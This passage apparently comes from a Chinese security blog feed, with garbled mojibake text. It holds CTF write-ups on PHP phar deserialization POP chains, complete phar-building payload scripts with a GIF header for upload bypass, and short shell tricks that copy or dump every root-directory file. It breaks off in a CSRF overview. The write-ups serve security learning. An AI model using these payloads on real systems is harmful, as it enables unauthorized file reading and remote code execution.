class="line">__callé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥æ‰¾FileListç±»æ˜¯å¦æœ‰callæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Filelist</span>::<span class="variable constant_">call</span>ï¼š</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__callæ–¹æ³•çš„å‚æ•°<span class="variable">$func</span>æ˜¯è¢«è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•å</span><br><span class="line">å…³æ³¨<span class="variable">$file</span>-&gt;<span class="variable">$func</span>()ï¼Œè°ƒç”¨äº†<span class="variable">$func</span>()</span><br></pre></td></tr></table></figure></li><li><p>$fileæ˜¯ä»€ä¹ˆï¼šå¾€å‰çœ‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">    <span class="comment">//çŸ¥é“$fileæ˜¯Fileå¯¹è±¡</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">//çŸ¥é“fileså­˜æ”¾pathä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¯¹è±¡($filenames = scandir($path);)</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure></li><li><p>å›çœ‹callæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="comment">//results[æ–‡ä»¶å][æ–¹æ³•å]=File::$funcçš„ç»“æœ</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥Filelist::callå°±æ˜¯å½“Filelistå¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ä¸åœ¨Filelistç±»æ—¶ï¼Œå°†è¯¥æ–¹æ³•ç”¨Fileç±»é‡è½½ï¼Œå¹¶æŠŠæ‰§è¡Œç»“æœä¿å­˜åˆ°Filelist.resultsä¸­ã€‚<br>æ‰€ä»¥å¦‚æœFilelistå¯¹è±¡è°ƒç”¨äº†closeæ–¹æ³•ï¼Œå°±ç›¸å½“äºè°ƒç”¨äº†File.close()ã€‚<br>æ‰€ä»¥$dbåº”è¯¥ä¸ºFilelistå¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨File.close()</p></li><li><p>ç»§ç»­å‘ä¸‹çœ‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)ä¸­å…³æ³¨</span></span><br><span class="line"><span class="function"><span class="title">foreach</span> (<span class="params"><span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">å°†æ–¹æ³•ç»“æœä¿å­˜åˆ°valueå³tableä¸­</span><br><span class="line">æœ€å<span class="keyword">echo</span> <span class="variable">$table</span>;å°±ç›¸å½“äº<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></li><li><p>åˆ°è¿™é‡Œæ€è·¯å°±æ¸…æ™°äº†ã€‚</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æˆ‘ä»¬è®©Userç±»ä¸­çš„<span class="variable">$db</span>ä¸ºFilelistå¯¹è±¡ï¼Œå½“<span class="variable">$db</span>é”€æ¯æ—¶è§¦å‘<span class="title class_">User</span>::<span class="title function_ invoke__">destruct</span>()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨closeæ–¹æ³•ï¼Œä½†æ˜¯<span class="title class_">Filelist</span>::<span class="variable constant_">close</span>ä¸å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘<span class="title class_">Filelist</span>::<span class="variable constant_">call</span>,ä»è€Œè°ƒç”¨<span class="title class_">File</span>::<span class="variable constant_">close</span>,æ‰§è¡Œ<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)ï¼Œæœ€åå°†ç»“æœè¿”å›è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;<span class="comment"># è¿™é‡Œçš„flag.txtæ˜¯å¤šæ¬¡çŒœæµ‹å‡ºæ¥çš„</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®©Userç±»ä¸­çš„$dbä¸ºFilelistå¯¹è±¡</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åå°†ç”Ÿæˆçš„phar.pharä¸Šä¼ (ç›´æ¥ä¿®æ”¹æ–‡ä»¶åç¼€ååä¸Šä¼ æˆ–è€…æŠ“åŒ…ä¿®æ”¹content-type)ä¸ºphar.gifï¼Œç„¶åä½¿ç”¨pharåè®®è®¿é—®æ–‡ä»¶ï¼Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥è®¿é—®ï¼Œdownload.phpå’Œdelete.phpï¼Œå‰é¢åˆ†æè¿‡dowmload.phpå¯¹ç›®å½•å’Œæ–‡ä»¶åä½œäº†é™åˆ¶ï¼Œæ‰€ä»¥ä½¿ç”¨delete.phpæ¥è¿›è¡Œè®¿é—®ã€‚</p><p><img src="/../images/image-20220708203217989-1687419234886.png" alt="image-20220708203217989"></p><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>I&#x2F;Oæ“ä½œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="variable constant_">file_get</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>$valueï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure><p>$keyï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__geté­”æœ¯æ–¹æ³•</span><br><span class="line">æ‰¾è¯»å–ä¸å­˜åœ¨/ä¿æŠ¤çš„å±æ€§</span><br><span class="line"></span><br><span class="line">show::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">è®©str[<span class="string">&#x27;str&#x27;</span>]ä¸ºTestç±»ï¼Œç„¶åTestç±»ä¸‹æ²¡æœ‰sourceå±æ€§å°±ä¼šè§¦å‘<span class="title class_">Test</span>::<span class="variable constant_">__get</span></span><br><span class="line">æ‰€ä»¥<span class="variable">$key</span>=source</span><br><span class="line">    </span><br><span class="line">__toStringæ–¹æ³•</span><br><span class="line">C1e4rä¸‹çš„__destruct <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">ä»¤testä¸ºshow</span><br></pre></td></tr></table></figure><p>POPé“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C1e4r::__destruct â†’ Show::__toString â†’ Test::__get â†’ Test::get  â†’ Test::file_get </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//æ³¨æ„æ„é€ çš„é¡ºåºï¼Œä»popé“¾å°¾åˆ°å¤´</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h4><p><a href="https://blog.csdn.net/qq_54929891/article/details/124785091">https://blog.csdn.net/qq_54929891/article/details/124785091</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Uploaderç±»</span></span><br><span class="line"><span class="comment"># å¦‚æœnameæœ‰èµ‹å€¼ï¼Œå¹¶é€šè¿‡è¿‡æ»¤ï¼Œfilename==nameï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™filename=$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment"># è¿”å›nameæˆ–è€…$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (Ã¢Â€Â²Ã¢Â–Â½`Ã£Â€Âƒ)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># æ¯ä¸€æ¬¡ä¸Šä¼ æ–‡ä»¶ç»“æŸåè§¦å‘</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment">#file_get_contentså’Œechoéƒ½ä¼šè§¦å‘tostringæ–¹æ³•ï¼Œæ‰€ä»¥å®è´¨ä¸Š$uploaderå°±ç­‰ä»·äº$filename</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Ã¤Â¸Â‹Ã©ÂÂ¢Ã¦Â˜Â¯Ã¤Â½Â Ã¤Â¸ÂŠÃ¤Â¼Â Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼Âš&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸€æ¬¡ä¸Šä¼ æ–‡ä»¶ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œå› ä¸ºè¿™æ—¶å€™nameæ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥filename&#x3D;$sandbox.$_SESSION[â€˜userâ€™].$extï¼Œè€Œä¸”å› ä¸ºç¬¬ä¸€æ¬¡è¿˜æ²¡è§¦å‘destructæ–¹æ³•ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ–‡ä»¶å®è´¨ä¸Šæ˜¯åœ¨tmpç›®å½•ï¼Œå› æ­¤<code>echo file_get_contents($uploader)</code>ä¸ºç©º</p><p>ç¬¬äºŒæ¬¡æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œç¬¬ä¸€æ¬¡ç»“æŸè§¦å‘destructæ–¹æ³•ï¼Œå°±ä¼šæŠŠä¸Šä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶ç§»åˆ°$filenameè·¯å¾„ï¼Œæ‰€ä»¥å°±ä¼šè¾“å‡ºä¸Šä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p></blockquote><p>ç¬¬ä¸€æ¬¡éšä¾¿ä¸Šä¼ æ–‡ä»¶ï¼Œè·å–<code>$_SESSION[&#39;user&#39;]</code>ï¼Œç”¨äºç»•è¿‡</p><p>ç¬¬äºŒæ¬¡ä¸Šä¼ pharæ–‡ä»¶</p><p>ç¬¬ä¸‰æ¬¡ç”¨nameå‚æ•°ç”¨pharåè®®è®¿é—®pharæ–‡ä»¶ï¼Œé€šè¿‡<code>file_get_contents($uploader)</code>è§¦å‘ååºåˆ—åŒ–å®Œæˆæ”»å‡»</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h2><p>ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946-1687675268129.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686-1687675268129.png" alt="image-20221107112233686"></p><p>ç„¶åå°è¯•è®¿é—®&#x2F;tmp&#x2F;aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜<code>&gt;a</code>å…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚</p><ul><li><p>è§£æ³•1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>cp /* .</code>ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;flagå³å¯</p><p><img src="/../images/image-20221107113239425-1687675268129.png" alt="image-20221107113239425"></p></li><li><p>è§£æ³•2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>nl /*&gt;a</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;aå³å¯</p><p><img src="/../images/image-20221107113608245-1687675268129.png" alt="image-20221107113608245"></p></li><li><p>è§£æ³•3</p><p>ç›´æ¥å†™ğŸ</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/05/31/CSRF/"/>
      <url>/2023/05/31/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ï¼Œåˆ©ç”¨ç”¨æˆ·çš„cookieè®©æœåŠ¡å™¨ä»¥ä¸ºæ˜¯ç”¨æˆ·æ“ä½œï¼Œä»è€Œå‘èµ·æ”»å‡»ã€‚</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>webåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œå¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸ºã€‚</p><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><p>ä¼ªé€ ç”¨æˆ·è¯·æ±‚ï¼Œç”¨æˆ·èƒ½åšå•¥ï¼Œè¿™ä¸ªæ¼æ´å°±èƒ½åšå•¥</p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><ul><li>æ•°æ®åŒ…æ— tokenå’ŒrefereréªŒè¯</li></ul><p>æ— tokenéªŒè¯å¹¶ä¸”æ— refereréªŒè¯æ—¶ï¼Œå°±åŸºæœ¬å­˜åœ¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä½†åŸºäºåŠŸèƒ½ç‚¹ä¸åŒï¼Œä¸€äº›ä¸ºæ— æ„ä¹‰æ— å±å®³çš„è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚</p><p>æäº¤æ•°æ®åŒ…æ—¶æŠ“åŒ…åˆ é™¤refererå­—æ®µï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œåˆ™åŸºæœ¬å­˜åœ¨è·¨åŸŸè¯·æ±‚ä¼ªé€ ï¼ŒGETå‹æ„é€ 